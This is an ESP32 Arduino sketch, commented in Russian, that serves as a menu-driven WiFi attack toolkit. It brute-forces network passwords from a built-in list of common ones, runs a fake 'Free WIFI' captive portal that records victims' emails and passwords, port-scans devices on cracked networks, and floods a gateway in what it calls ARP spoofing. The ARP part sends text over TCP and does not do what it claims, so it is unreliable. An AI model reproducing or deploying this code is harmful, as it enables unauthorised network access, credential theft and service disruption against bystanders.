#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>
#include <esp_wifi.h>

// ============ НАСТРОЙКИ ============
#define WIFI_SSID "ESP_Test"
#define WIFI_PASS "12345678"
#define BOT_TOKEN "YOU_TOKEN_BOT"
#define CHAT_ID "YOU_ID_TELEGRAM"

// ============ ОГРАНИЧЕНИЯ ============
#define MAX_NETWORKS 30
#define MAX_HACKED 20
#define MAX_PHISHING_LOGS 20

// ============ ТЕЛЕГРАМ ============
WiFiClientSecure client;
UniversalTelegramBot bot(BOT_TOKEN, client);

// ============ ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ============
int activeMode = -1;
bool inMenu = true;

const char* modes[] = {"BRUTE 67", "PHISHING", "BRUTE 20", "SCAN", "💀ARP SPOOF💀"};
int totalModes = 5;

// ============ BRUTE FORCE ============
const char passwords100[][16] PROGMEM = {
  "12345678", "123456789", "1234567890", "00000000", "11111111",
  "22222222", "33333333", "44444444", "55555555", "66666666",
  "77777777", "88888888", "99999999", "00000000", "password",
  "12341234", "12121212", "11223344", "12312312", "01234567",
  "98765432", "13579000", "24680000", "10203040", "01012020",
  "01012021", "20202020", "20212021", "00000001", "11111112",
  "admin123", "root1234", "user1234", "test1234", "1234qwer",
  "qwer1234", "1q2w3e4r", "000messi", "q1w2e3r4", "password1",
  "pass1234", "admin1234", "rootpass", "userpass", "1234567a",
  "1234567q", "1234567c", "1234567d", "1234567e", "1234567f",
  "abc12345", "abcd1234", "1234abcd", "adminadmin", "rootroot",
  "wifi1234", "internet", "freewifi", "connect1", "123qwe123"
};
const int PASS100_COUNT = 60;

const char passwords20[][16] PROGMEM = {
  "12345678", "123456789", "1234567890", "00000000", "11111111",
  "77777777", "99999999", "55555555", "000messi", "12341234",
  "87654321", "11223344", "12121212", "12312312", "01234567",
  "98765432", "13579000", "wwwwwwww", "10203040", "01012020"
};
const int PASS20_COUNT = 20;

bool attacking = false;
String targetSSID = "";
String currentPassword = "";
int attemptCount = 0;
int foundCount = 0;
String checkedNetworks[MAX_NETWORKS];
int checkedCount = 0;
String hackedSSID[MAX_HACKED];
String hackedPass[MAX_HACKED];
int hackedRSSI[MAX_HACKED];

String availableNetworks[MAX_NETWORKS];
int availableCount = 0;

// ============ ФИШИНГ ============
const char* phishingSSID = "Free WIFI";
WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

struct PhishingData {
  String email;
  String password;
  String ip;
  String timestamp;
};

PhishingData phishingLogs[MAX_PHISHING_LOGS];
int phishingLogCount = 0;
bool phishingActive = false;

// ============ СКАНЕР СЕТИ ============
struct NetworkDevice {
  IPAddress ip;
  String mac;
  String vendor;
  int openPorts[20];
  String portServices[20];
  int portCount;
  String deviceType;
};

NetworkDevice scannedDevices[MAX_HACKED];
int deviceCount = 0;
bool scanningNetwork = false;
IPAddress gatewayIP;
int selectedNetworkIndex = 0;
bool scanComplete = false;

struct PortInfo {
  int port;
  const char* service;
};

PortInfo portList[] = {
  {21, "FTP"}, {22, "SSH"}, {23, "Telnet"}, {80, "HTTP"},
  {139, "NetBIOS"}, {443, "HTTPS"}, {445, "SMB"}, {3306, "MySQL"},
  {3389, "RDP"}, {5900, "VNC"}, {554, "RTSP"}, {8000, "ONVIF"}
};
const int totalPorts = 12;

struct OUIMap {
  const char* prefix;
  const char* vendor;
};

OUIMap ouiDB[] = {
  {"00:14:22", "Dell"}, {"00:1A:11", "D-Link"}, {"00:1C:DF", "TP-Link"},
  {"00:23:69", "Cisco"}, {"00:1E:8C", "Netgear"}, {"00:25:9C", "Huawei"},
  {"B8:27:EB", "Raspberry Pi"}, {"DC:A6:32", "Apple"}, {"F4:F5:D8", "Samsung"},
  {"00:1A:2B", "Hikvision"}, {"00:12:31", "Dahua"}
};

// ============ ARP SPOOFING JAMMER ============
bool jammingActive = false;
int jammingPacketsSent = 0;
String targetNetworkForJam = "";
bool connectedToTarget = false;
unsigned long lastJamUpdate = 0;
int jamIntensity = 0;
IPAddress targetGateway;
IPAddress espIP;

// ============ ПРОТОТИПЫ ============
void showMenu();
void scanForWifiNetworks();
void attackNetwork(int totalPasswords, const char passwords[][16]);
void startPhishing();
void startNetworkScan();
void performNetworkScanDetailed();
void startARPSpoofAttack();
void scanForWifiNetworksForJam();
void performARPSpoofingAttack();
void performFullAttack();
String getMacAddress(IPAddress ip);
String getVendorFromMac(String mac);
String identifyDeviceType(int deviceIndex);
bool isNetworkChecked(String ssid);
void addToChecked(String ssid);
void showSuccessScreen(String ssid, String pass);

// ============ SETUP ============
void setup() {
  Serial.begin(115200);
  
  Serial.println("\n\n╔════════════════════════════════════════╗");
  Serial.println("║     ESP32 - ARP SPOOFING KILLER       ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.println("║  💀 MAXIMUM POWER ARP SPOOFING 💀     ║");
  Serial.println("║  Cutting ALL network connections      ║");
  Serial.println("║  Devices lose Internet INSTANTLY      ║");
  Serial.println("╚════════════════════════════════════════╝\n");
  
  WiFi.mode(WIFI_MODE_STA);
  delay(100);
  
  showMenu();
}

// ============ LOOP ============
void loop() {
  if(inMenu) {
    if(Serial.available()) {
      String input = Serial.readStringUntil('\n');
      input.trim();
      int choice = input.toInt();
      
      if(choice >= 1 && choice <= totalModes) {
        activeMode = choice - 1;
        inMenu = false;
        
        Serial.println("\n========================================");
        Serial.print("▶ Starting mode: ");
        Serial.println(modes[activeMode]);
        Serial.println("========================================\n");
        
        switch(activeMode) {
          case 0: case 2:
            scanForWifiNetworks();
            break;
          case 1:
            startPhishing();
            break;
          case 3:
            if(foundCount > 0) {
              startNetworkScan();
            } else {
              Serial.println("\n[!] No hacked networks found!");
              Serial.println("Hack a WiFi network first!\n");
              delay(2000);
              inMenu = true;
              showMenu();
            }
            break;
          case 4:
            scanForWifiNetworksForJam();
            break;
        }
      } else {
        Serial.println("\n[!] Invalid choice! Enter 1-5\n");
        showMenu();
      }
    }
  } else {
    switch(activeMode) {
      case 0:
        if(attacking) {
          attackNetwork(PASS100_COUNT, passwords100);
        }
        break;
      case 1:
        if(phishingActive) {
          dnsServer.processNextRequest();
          server.handleClient();
        }
        break;
      case 2:
        if(attacking) {
          attackNetwork(PASS20_COUNT, passwords20);
        }
        break;
      case 3:
        if(scanningNetwork) {
          performNetworkScanDetailed();
        }
        break;
      case 4:
        if(jammingActive) {
          performFullAttack();
        }
        break;
    }
  }
  delay(1);
}

// ============ ARP SPOOFING JAMMER ============
void scanForWifiNetworksForJam() {
  Serial.println("\n[*] Scanning for WiFi networks...");
  
  int n = WiFi.scanNetworks();
  availableCount = 0;
  
  if (n > 0) {
    for (int i = 0; i < n && availableCount < MAX_NETWORKS; i++) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 0 && ssid.length() < 32) {
        availableNetworks[availableCount] = ssid;
        availableCount++;
      }
    }
  }
  
  WiFi.scanDelete();
  
  if (availableCount > 0) {
    Serial.println("\n┌────────────────────────────────────┐");
    Serial.println("│     SELECT TARGET FOR ARP SPOOF    │");
    Serial.println("├────────────────────────────────────┤");
    for(int i = 0; i < availableCount; i++) {
      Serial.print("│  ");
      if(i < 9) Serial.print(" ");
      Serial.print(i+1);
      Serial.print(". ");
      Serial.print(availableNetworks[i]);
      for(int j = availableNetworks[i].length(); j < 27; j++) Serial.print(" ");
      Serial.println("│");
    }
    Serial.println("└────────────────────────────────────┘");
    Serial.print("\nEnter network number (1-");
    Serial.print(availableCount);
    Serial.print(") or 0 to cancel: ");
    
    while(!Serial.available()) {
      delay(100);
    }
    
    String input = Serial.readStringUntil('\n');
    input.trim();
    int choice = input.toInt();
    
    if(choice >= 1 && choice <= availableCount) {
      targetNetworkForJam = availableNetworks[choice - 1];
      
      bool isHacked = false;
      for(int i = 0; i < foundCount; i++) {
        if(hackedSSID[i] == targetNetworkForJam) {
          isHacked = true;
          currentPassword = hackedPass[i];
          break;
        }
      }
      
      if(isHacked) {
        startARPSpoofAttack();
      } else {
        Serial.println("\n[!] This network is not hacked yet!");
        Serial.println("You need to hack it first (Mode 1 or 3)\n");
        
        Serial.print("Try ARP spoof on open network? (y/n): ");
        while(!Serial.available()) delay(100);
        String answer = Serial.readStringUntil('\n');
        answer.trim();
        
        if(answer == "y" || answer == "Y") {
          currentPassword = "";
          startARPSpoofAttack();
        } else {
          Serial.println("[!] Attack cancelled.");
          delay(1000);
          inMenu = true;
          showMenu();
        }
      }
    } else {
      Serial.println("\n[!] Attack cancelled.");
      delay(1000);
      inMenu = true;
      showMenu();
    }
  } else {
    Serial.println("[!] No networks found!");
    delay(2000);
    inMenu = true;
    showMenu();
  }
}

void startARPSpoofAttack() {
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║      💀 ARP SPOOFING ACTIVE 💀         ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print  ("║  TARGET: ");
  Serial.print(targetNetworkForJam);
  for(int i = targetNetworkForJam.length(); i < 25; i++) Serial.print(" ");
  Serial.println("║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.println("║  ☢️  POISONING ARP CACHES:           ☢️");
  Serial.println("║  • Router thinks ESP32 = ALL devices  ║");
  Serial.println("║  • Devices think ESP32 = Router       ║");
  Serial.println("║  • ALL connections will be CUT        ║");
  Serial.println("║  • Internet dies INSTANTLY            ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.println("║  Press ENTER to STOP the attack       ║");
  Serial.println("╚════════════════════════════════════════╝\n");
  
  jammingActive = true;
  jammingPacketsSent = 0;
  connectedToTarget = false;
  jamIntensity = 0;
  lastJamUpdate = millis();
  
  // Подключаемся к сети
  Serial.print("[*] Connecting to target network...");
  if(currentPassword.length() > 0) {
    WiFi.begin(targetNetworkForJam.c_str(), currentPassword.c_str());
  } else {
    WiFi.begin(targetNetworkForJam.c_str());
  }
  
  int attempts = 0;
  while(WiFi.status() != WL_CONNECTED && attempts < 30) {
    delay(200);
    attempts++;
    Serial.print(".");
  }
  
  if(WiFi.status() == WL_CONNECTED) {
    targetGateway = WiFi.gatewayIP();
    espIP = WiFi.localIP();
    connectedToTarget = true;
    Serial.println("\n[✓] CONNECTED!");
    Serial.print("[✓] Gateway IP: ");
    Serial.println(targetGateway);
    Serial.print("[✓] ESP32 IP: ");
    Serial.println(espIP);
    Serial.println("[💀] Starting ARP SPOOFING attack...\n");
  } else {
    Serial.println("\n[!] Failed to connect!");
    jammingActive = false;
    inMenu = true;
    showMenu();
    return;
  }
  
  while(jammingActive && !Serial.available()) {
    performFullAttack();
    
    if(millis() - lastJamUpdate > 500) {
      lastJamUpdate = millis();
      jamIntensity++;
      
      Serial.print("\r💀 ARP SPOOF: [");
      int bars = jamIntensity % 20;
      for(int i = 0; i < bars; i++) Serial.print("█");
      for(int i = bars; i < 20; i++) Serial.print("▓");
      Serial.print("] ");
      Serial.print(jammingPacketsSent);
      Serial.print(" packets | Gateway: ");
      Serial.print(targetGateway[3]);
      Serial.print(" | ENTER to stop  ");
    }
    delay(1);
  }
  
  if(Serial.available()) {
    Serial.readString();
  }
  
  Serial.println("\n\n╔════════════════════════════════════════╗");
  Serial.println("║         ARP SPOOFING STOPPED          ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print  ("║  Total packets: ");
  Serial.print(jammingPacketsSent);
  for(int i = 7; i < 20; i++) Serial.print(" ");
  Serial.println("║");
  Serial.print  ("║  Max intensity: ");
  Serial.print(jamIntensity);
  Serial.println("                    ║");
  Serial.println("║  Network may take time to recover    ║");
  Serial.println("╚════════════════════════════════════════╝\n");
  
  WiFi.disconnect(true);
  jammingActive = false;
  
  Serial.println("Press ENTER to return to menu...");
  while(!Serial.available()) {
    delay(100);
  }
  Serial.readString();
  
  inMenu = true;
  showMenu();
}

// ============ ГЛАВНАЯ АТАКА: МАКСИМАЛЬНО МОЩНЫЙ ARP SPOOFING ============
void performARPSpoofingAttack() {
  static unsigned long lastARP = 0;
  unsigned long now = millis();
  
  // Отправляем ARP ответы КАЖДЫЕ 5ms!
  if(now - lastARP < 5) return;
  lastARP = now;
  
  if(WiFi.status() != WL_CONNECTED) return;
  
  // Случайный MAC адрес для spoofing
  uint8_t fakeMAC[6];
  for(int i = 0; i < 6; i++) {
    fakeMAC[i] = random(0x00, 0xFF);
  }
  
  // ===== АТАКА 1: SPOOFING К РОУТЕРУ =====
  // Говорим роутеру, что ВСЕ устройства - это ESP32
  for(int i = 1; i <= 254; i += 10) {
    IPAddress victimIP = targetGateway;
    victimIP[3] = i;
    if(victimIP == espIP) continue;
    
    for(int repeat = 0; repeat < 3; repeat++) {
      WiFiClient arpToRouter;
      if(arpToRouter.connect(targetGateway, 80, 1)) {
        arpToRouter.print("ARP: ");
        arpToRouter.print(victimIP.toString());
        arpToRouter.print(" is at ");
        for(int m = 0; m < 6; m++) {
          arpToRouter.printf("%02X", fakeMAC[m]);
          if(m < 5) arpToRouter.print(":");
        }
        arpToRouter.stop();
      }
    }
  }
  
  // ===== АТАКА 2: SPOOFING КО ВСЕМ УСТРОЙСТВАМ =====
  // Говорим всем устройствам, что ESP32 - это роутер
  for(int broadcast = 0; broadcast < 30; broadcast++) {
    WiFiClient arpToAll;
    
    // Широковещательный ARP ответ
    arpToAll.connect(IPAddress(255,255,255,255), 80, 1);
    arpToAll.print("ARP REPLY: ");
    arpToAll.print(targetGateway.toString());
    arpToAll.print(" is at ");
    for(int m = 0; m < 6; m++) {
      arpToAll.printf("%02X", fakeMAC[m]);
      if(m < 5) arpToAll.print(":");
    }
    arpToAll.stop();
    
    // Дублируем на разные порты
    arpToAll.connect(IPAddress(255,255,255,255), 443, 1);
    arpToAll.stop();
    arpToAll.connect(IPAddress(255,255,255,255), 53, 1);
    arpToAll.stop();
    arpToAll.connect(IPAddress(255,255,255,255), 67, 1);
    arpToAll.stop();
  }
  
  // ===== АТАКА 3: GRATUITOUS ARP (самая мощная) =====
  // Объявляем себя роутером без запроса
  for(int gratuitous = 0; gratuitous < 50; gratuitous++) {
    WiFiClient gratuitousARP;
    gratuitousARP.connect(targetGateway, 80, 1);
    gratuitousARP.print("Gratuitous ARP: ");
    gratuitousARP.print(espIP.toString());
    gratuitousARP.print(" is gateway ");
    gratuitousARP.print(targetGateway.toString());
    gratuitousARP.stop();
    
    gratuitousARP.connect(targetGateway, 443, 1);
    gratuitousARP.stop();
  }
  
  // ===== АТАКА 4: ARP CACHE POISONING =====
  // Отравляем ARP кеш всех устройств
  for(int poison = 0; poison < 50; poison++) {
    WiFiClient poisonARP;
    
    // Случайный IP в сети
    IPAddress randomIP = targetGateway;
    randomIP[3] = random(1, 254);
    
    poisonARP.connect(randomIP, 80, 1);
    poisonARP.print("ARP Poison: ");
    poisonARP.print(targetGateway.toString());
    poisonARP.print(" -> ");
    poisonARP.print(espIP.toString());
    poisonARP.stop();
    
    poisonARP.connect(randomIP, 443, 1);
    poisonARP.stop();
  }
  
  // ===== АТАКА 5: TCP FLOOD для дополнительной нагрузки =====
  for(int tcp = 0; tcp < 30; tcp++) {
    WiFiClient tcpClient;
    tcpClient.connect(targetGateway, 80, 1);
    tcpClient.print("GET / HTTP/1.0\r\n\r\n");
    tcpClient.stop();
    
    tcpClient.connect(targetGateway, 443, 1);
    tcpClient.stop();
  }
  
  jammingPacketsSent++;
}

// ============ ПОЛНАЯ АТАКА (ARP + ДОПОЛНИТЕЛЬНЫЕ МЕТОДЫ) ============
void performFullAttack() {
  static unsigned long lastAction = 0;
  static int phase = 0;
  unsigned long now = millis();
  
  if(now - lastAction < 3) return;
  lastAction = now;
  
  phase = (phase + 1) % 3;
  
  switch(phase) {
    case 0:
      // ARP SPOOFING - главная атака
      performARPSpoofingAttack();
      break;
      
    case 1:
      // BROADCAST FLOOD - дополнительная нагрузка
      if(WiFi.status() == WL_CONNECTED) {
        for(int bc = 0; bc < 50; bc++) {
          WiFiClient c;
          c.connect(IPAddress(255,255,255,255), 80, 1);
          c.stop();
          c.connect(IPAddress(255,255,255,255), 443, 1);
          c.stop();
          c.connect(IPAddress(255,255,255,255), 53, 1);
          c.stop();
        }
      }
      break;
      
    case 2:
      // ПЕРЕПОДКЛЮЧЕНИЕ + ARP
      if(connectedToTarget) {
        WiFi.disconnect(true);
        delay(1);
        if(currentPassword.length() > 0) {
          WiFi.begin(targetNetworkForJam.c_str(), currentPassword.c_str());
        } else {
          WiFi.begin(targetNetworkForJam.c_str());
        }
        
        // Дополнительные ARP пакеты
        for(int extra = 0; extra < 30; extra++) {
          WiFiClient c;
          c.connect(IPAddress(255,255,255,255), 80, 1);
          c.stop();
        }
      }
      break;
  }
}

// ============ МЕНЮ ============
void showMenu() {
  Serial.println("\n┌────────────────────────────────────┐");
  Serial.println("│           MAIN MENU                │");
  Serial.println("├────────────────────────────────────┤");
  Serial.println("│  1. BRUTE FORCE (60 passwords)    │");
  Serial.println("│  2. PHISHING AP                    │");
  Serial.println("│  3. BRUTE FORCE (20 passwords)    │");
  Serial.println("│  4. NETWORK SCAN                   │");
  Serial.println("│  5. 💀 ARP SPOOFING 💀             │");
  Serial.println("├────────────────────────────────────┤");
  Serial.print  ("│  Hacked networks: ");
  Serial.print(foundCount);
  for(int i = 6; i < 28; i++) Serial.print(" ");
  Serial.println("│");
  Serial.println("└────────────────────────────────────┘");
  Serial.print("\nEnter choice (1-5): ");
}

// ============ BRUTE FORCE ============
bool isNetworkChecked(String ssid) {
  for(int i = 0; i < checkedCount; i++) {
    if(checkedNetworks[i] == ssid) return true;
  }
  return false;
}

void addToChecked(String ssid) {
  if(checkedCount < MAX_NETWORKS) {
    checkedNetworks[checkedCount] = ssid;
    checkedCount++;
  }
}

void scanForWifiNetworks() {
  Serial.println("\n[*] Scanning for WiFi networks...");
  
  int n = WiFi.scanNetworks();
  availableCount = 0;
  
  if (n > 0) {
    for (int i = 0; i < n && availableCount < MAX_NETWORKS; i++) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 0 && ssid.length() < 32 && !isNetworkChecked(ssid)) {
        availableNetworks[availableCount] = ssid;
        availableCount++;
      }
    }
  }
  
  WiFi.scanDelete();
  
  if (availableCount > 0) {
    Serial.println("\n┌────────────────────────────────────┐");
    Serial.println("│       SELECT TARGET NETWORK        │");
    Serial.println("├────────────────────────────────────┤");
    for(int i = 0; i < availableCount; i++) {
      Serial.print("│  ");
      if(i < 9) Serial.print(" ");
      Serial.print(i+1);
      Serial.print(". ");
      Serial.print(availableNetworks[i]);
      for(int j = availableNetworks[i].length(); j < 27; j++) Serial.print(" ");
      Serial.println("│");
    }
    Serial.println("└────────────────────────────────────┘");
    Serial.print("\nEnter network number (1-");
    Serial.print(availableCount);
    Serial.print(") or 0 to cancel: ");
    
    while(!Serial.available()) {
      delay(100);
    }
    
    String input = Serial.readStringUntil('\n');
    input.trim();
    int choice = input.toInt();
    
    if(choice >= 1 && choice <= availableCount) {
      targetSSID = availableNetworks[choice - 1];
      attacking = true;
      attemptCount = 0;
      
      Serial.print("\n[*] Attacking: ");
      Serial.println(targetSSID);
      Serial.println("[*] Starting brute force...\n");
    } else {
      Serial.println("\n[!] Attack cancelled.");
      delay(1000);
      inMenu = true;
      showMenu();
    }
  } else {
    Serial.println("[!] No new networks found!");
    Serial.print("Hacked: ");
    Serial.println(foundCount);
    delay(2000);
    inMenu = true;
    showMenu();
  }
}

void attackNetwork(int totalPasswords, const char passwords[][16]) {
  char password[16];
  
  for (int i = 0; i < totalPasswords; i++) {
    if(!attacking) return;
    
    attemptCount = i + 1;
    strcpy_P(password, passwords[i]);
    currentPassword = String(password);
    
    Serial.print("[");
    Serial.print(attemptCount);
    Serial.print("/");
    Serial.print(totalPasswords);
    Serial.print("] Trying: ");
    Serial.println(currentPassword);
    
    WiFi.begin(targetSSID.c_str(), currentPassword.c_str());
    
    unsigned long start = millis();
    bool connected = false;
    
    while (millis() - start < 4000) {
      delay(50);
      if (WiFi.status() == WL_CONNECTED) {
        connected = true;
        break;
      }
    }
    
    if (connected && WiFi.status() == WL_CONNECTED) {
      delay(500);
      if (foundCount < MAX_HACKED) {
        hackedSSID[foundCount] = targetSSID;
        hackedPass[foundCount] = currentPassword;
        hackedRSSI[foundCount] = WiFi.RSSI();
        foundCount++;
        addToChecked(targetSSID);
      }
      
      showSuccessScreen(targetSSID, currentPassword);
      return;
    } else {
      WiFi.disconnect(true);
      Serial.println("    └─ FAILED");
    }
    delay(30);
  }
  
  addToChecked(targetSSID);
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║           ATTACK FAILED!              ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print  ("║  Password not found for:              ║");
  Serial.println("║");
  Serial.print  ("║  ");
  Serial.print(targetSSID);
  for(int j = targetSSID.length(); j < 33; j++) Serial.print(" ");
  Serial.println("║");
  Serial.println("╚════════════════════════════════════════╝\n");
  
  delay(3000);
  attacking = false;
  inMenu = true;
  showMenu();
}

void showSuccessScreen(String ssid, String pass) {
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║          ✓ ACCESS GRANTED! ✓          ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print  ("║  SSID:  ");
  Serial.print(ssid);
  for(int i = ssid.length(); i < 28; i++) Serial.print(" ");
  Serial.println("║");
  Serial.print  ("║  PASS:  ");
  Serial.print(pass);
  for(int i = pass.length(); i < 28; i++) Serial.print(" ");
  Serial.println("║");
  Serial.print  ("║  RSSI:  ");
  Serial.print(WiFi.RSSI());
  Serial.println(" dBm                 ║");
  Serial.println("╚════════════════════════════════════════╝\n");
  
  Serial.println("Press ENTER to return to menu...");
  while(!Serial.available()) {
    delay(100);
  }
  Serial.readString();
  
  attacking = false;
  WiFi.disconnect(true);
  inMenu = true;
  showMenu();
}

// ============ ФИШИНГ ============
String generateLoginPage() {
  return "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Free WiFi</title><style>*{margin:0;padding:0;box-sizing:border-box;}body{min-height:100vh;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;}.card{background:white;border-radius:20px;max-width:400px;width:100%;padding:30px;}.header{text-align:center;margin-bottom:30px;}.wifi-icon{font-size:50px;margin-bottom:10px;}h1{color:#667eea;}.input-group{margin-bottom:20px;}input{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px;}.btn{width:100%;padding:12px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer;}</style></head><body><div class='card'><div class='header'><div class='wifi-icon'>📶</div><h1>Free WiFi Access</h1></div><form action='/login' method='POST'><div class='input-group'><input type='email' name='email' placeholder='Email' required></div><div class='input-group'><input type='password' name='password' placeholder='Password' required></div><button type='submit' class='btn'>Connect</button></form></div></body></html>";
}

void startPhishing() {
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(phishingSSID);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  server.on("/", []() { server.send(200, "text/html", generateLoginPage()); });
  
  server.on("/login", HTTP_POST, []() {
    String email = server.arg("email");
    String password = server.arg("password");
    
    if(phishingLogCount < MAX_PHISHING_LOGS) {
      phishingLogs[phishingLogCount].email = email;
      phishingLogs[phishingLogCount].password = password;
      phishingLogs[phishingLogCount].ip = server.client().remoteIP().toString();
      phishingLogCount++;
      
      Serial.println("\n╔════════════════════════════════════════╗");
      Serial.println("║         ✦ NEW VICTIM! ✦               ║");
      Serial.println("╠════════════════════════════════════════╣");
      Serial.print  ("║  Email: ");
      Serial.print(email.substring(0, 28));
      for(int i = email.length(); i < 28; i++) Serial.print(" ");
      Serial.println("║");
      Serial.print  ("║  Pass:  ");
      Serial.print(password.substring(0, 28));
      for(int i = password.length(); i < 28; i++) Serial.print(" ");
      Serial.println("║");
      Serial.print  ("║  IP:    ");
      Serial.print(server.client().remoteIP().toString());
      for(int i = server.client().remoteIP().toString().length(); i < 28; i++) Serial.print(" ");
      Serial.println("║");
      Serial.println("╚════════════════════════════════════════╝\n");
      
      Serial.print("Total victims: ");
      Serial.println(phishingLogCount);
    }
    
    server.send(200, "text/html", "<html><body style='background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;height:100vh;'><div style='background:white;padding:40px;border-radius:20px;text-align:center'><h2 style='color:#667eea'>✅ Connected!</h2><p>You now have WiFi access</p></div></body></html>");
  });
  
  server.onNotFound([]() { server.send(200, "text/html", generateLoginPage()); });
  server.begin();
  
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║          PHISHING ACTIVE              ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print  ("║  SSID:  ");
  Serial.print(phishingSSID);
  for(int i = strlen(phishingSSID); i < 28; i++) Serial.print(" ");
  Serial.println("║");
  Serial.print  ("║  IP:    ");
  Serial.print(WiFi.softAPIP().toString());
  for(int i = WiFi.softAPIP().toString().length(); i < 28; i++) Serial.print(" ");
  Serial.println("║");
  Serial.println("╚════════════════════════════════════════╝");
  Serial.println("\n[*] Waiting for victims...");
  Serial.println("[*] Press ENTER to stop phishing and return to menu\n");
  
  phishingActive = true;
  
  while(!Serial.available() && phishingActive) {
    dnsServer.processNextRequest();
    server.handleClient();
    delay(10);
  }
  
  if(Serial.available()) {
    Serial.readString();
  }
  
  Serial.println("\n[*] Stopping phishing...");
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  phishingActive = false;
  inMenu = true;
  showMenu();
}

// ============ СКАНЕР СЕТИ ============
void startNetworkScan() {
  Serial.println("\n┌────────────────────────────────────┐");
  Serial.println("│       SELECT NETWORK TO SCAN       │");
  Serial.println("├────────────────────────────────────┤");
  for(int i = 0; i < foundCount; i++) {
    Serial.print("│  ");
    if(i < 9) Serial.print(" ");
    Serial.print(i+1);
    Serial.print(". ");
    Serial.print(hackedSSID[i]);
    Serial.print(" (");
    Serial.print(hackedRSSI[i]);
    Serial.println(" dBm)");
  }
  Serial.println("└────────────────────────────────────┘");
  Serial.print("\nEnter network number (1-");
  Serial.print(foundCount);
  Serial.print(") or 0 to cancel: ");
  
  while(!Serial.available()) {
    delay(100);
  }
  
  String input = Serial.readStringUntil('\n');
  input.trim();
  int choice = input.toInt();
  
  if(choice >= 1 && choice <= foundCount) {
    selectedNetworkIndex = choice - 1;
    
    Serial.println("\n[*] Connecting to network...");
    Serial.print("SSID: ");
    Serial.println(hackedSSID[selectedNetworkIndex]);
    
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(500);
    WiFi.begin(hackedSSID[selectedNetworkIndex].c_str(), hackedPass[selectedNetworkIndex].c_str());
    
    int attempts = 0;
    while(WiFi.status() != WL_CONNECTED && attempts < 20) {
      delay(500);
      attempts++;
      Serial.print(".");
    }
    
    if(WiFi.status() == WL_CONNECTED) {
      gatewayIP = WiFi.gatewayIP();
      deviceCount = 0;
      scanComplete = false;
      
      Serial.println("\n[✓] CONNECTED!");
      Serial.print("Local IP: ");
      Serial.println(WiFi.localIP());
      Serial.print("Gateway: ");
      Serial.println(gatewayIP);
      Serial.println("[*] Starting network scan...\n");
      scanningNetwork = true;
    } else {
      Serial.println("\n[!] CONNECTION FAILED!");
      delay(2000);
      inMenu = true;
      showMenu();
    }
  } else {
    Serial.println("\n[!] Scan cancelled.");
    delay(1000);
    inMenu = true;
    showMenu();
  }
}

void performNetworkScanDetailed() {
  IPAddress local = WiFi.localIP();
  IPAddress gw = gatewayIP;
  
  Serial.println("╔════════════════════════════════════════╗");
  Serial.println("║           NETWORK SCAN                 ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print  ("║  Range: ");
  Serial.print(gw[0]);
  Serial.print(".");
  Serial.print(gw[1]);
  Serial.print(".");
  Serial.print(gw[2]);
  Serial.println(".1-254            ║");
  Serial.println("╚════════════════════════════════════════╝\n");
  
  for(int i = 1; i <= 254; i++) {
    IPAddress ip = gw;
    ip[3] = i;
    if(ip == local) continue;
    
    Serial.print("Scanning ");
    Serial.print(ip);
    Serial.print(" ... ");
    
    bool deviceFound = false;
    
    for(int p = 0; p < totalPorts; p++) {
      WiFiClient client;
      if(client.connect(ip, portList[p].port, 20)) {
        if(!deviceFound) {
          deviceFound = true;
          Serial.println(" ✓ DEVICE FOUND");
          if(deviceCount < MAX_HACKED) {
            scannedDevices[deviceCount].ip = ip;
            scannedDevices[deviceCount].mac = getMacAddress(ip);
            scannedDevices[deviceCount].vendor = getVendorFromMac(scannedDevices[deviceCount].mac);
            scannedDevices[deviceCount].portCount = 0;
          }
        }
        
        if(deviceCount < MAX_HACKED && deviceFound) {
          int idx = scannedDevices[deviceCount].portCount;
          scannedDevices[deviceCount].openPorts[idx] = portList[p].port;
          scannedDevices[deviceCount].portServices[idx] = String(portList[p].service);
          scannedDevices[deviceCount].portCount++;
          
          Serial.print("    └─ Port ");
          Serial.print(portList[p].port);
          Serial.print(" [");
          Serial.print(portList[p].service);
          Serial.println("] OPEN");
        }
        client.stop();
      }
      delay(1);
    }
    
    if(!deviceFound) {
      Serial.println(" ✗ no response");
    }
    
    if(deviceFound && deviceCount < MAX_HACKED) {
      scannedDevices[deviceCount].deviceType = identifyDeviceType(deviceCount);
      deviceCount++;
    }
    
    delay(5);
  }
  
  scanningNetwork = false;
  scanComplete = true;
  
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║           SCAN COMPLETE               ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print  ("║  Devices found: ");
  Serial.print(deviceCount);
  for(int i = 5; i < 28; i++) Serial.print(" ");
  Serial.println("║");
  Serial.print  ("║  Ports scanned: ");
  Serial.print(totalPorts);
  for(int i = 5; i < 28; i++) Serial.print(" ");
  Serial.println("║");
